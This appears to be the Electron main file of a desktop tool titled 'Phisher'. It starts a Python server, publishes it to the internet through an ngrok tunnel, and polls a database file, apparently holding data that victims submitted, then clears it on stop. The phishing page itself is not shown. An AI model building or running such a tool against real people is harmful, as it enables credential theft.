// Modules to control application life and create native browser window
const {app, BrowserWindow, ipcMain} = require('electron');
const menu = require("./menu");
const {PythonShell} = require('python-shell');
const ngrok = require('ngrok');
const fs = require('fs');
// const shelljs = require('shelljs');


let mainWindow
function createWindow () {
  // Create the browser window.
  mainWindow = new BrowserWindow({
    width: 800,
    height: 600,
    maxHeight: 590,
    maxWidth: 400,
    minHeight: 590,
    minWidth: 400,
    title: "Phisher",
    icon:"Pisher/icons/icons/16x16.png"

  })

  // and load the index.html of the app.
  mainWindow.loadFile('Pisher/main.html')


// //Is ngrok is installed before the app start ?
// function checkNgrokExecutable(){
//   shelljs.exec('ngrok', (err, output)=>{
//     if(err){
//       ipcMain.send('ngrok-exec-err', true)
//     }

//   })
// }
// checkNgrokExecutable();

  mainWindow.on('closed', function () {
    mainWindow = null
    app.quit()
  })
}



//Tracking SetInterval
let interval;
let shell;
ipcMain.on('start-stop', (e, message)=>{

  if(message){
    try {
    shell = new PythonShell('./python_scripts/app.py', null);   // start python server
  }catch(err) {
    e.sender.send('internal-server-error', true);
  }
    //Port farward local server URL with ngrok for WAN
    try{
    (async function() {
      const ngrokURL = await ngrok.connect(5000);
      e.sender.send('start-reply', ngrokURL);
    })();
  }catch {
    e.sender.send('ngrok-failed', true);
  }
    //Check database file in loop after 2 sec delay
    
      interval = setInterval(()=>{
      fs.readFile('python_scripts/database/db_1',(err, content)=>{
          let fileContent = content;
          e.sender.send('database-content', fileContent);      
      });
  }, 2000);
} // if ends here

  // Close ngrok and python terminal if STOP button is pressed 
else if(message === false){
     //stop python server
    shell.terminate();
    ngrok.disconnect();
    clearInterval(interval);
    fs.writeFile('python_scripts/database/db_1', "", ()=>{
    });
  } //else ends here 
}); 
//ipclistener end here 



app.on('ready', createWindow)

// Quit when all windows are closed.
app.on('window-all-closed', function () {
  if (process.platform !== 'darwin') {
    app.quit()
  }
})

app.on('activate', function () {
  if (mainWindow === null) {
    createWindow()
  }
})
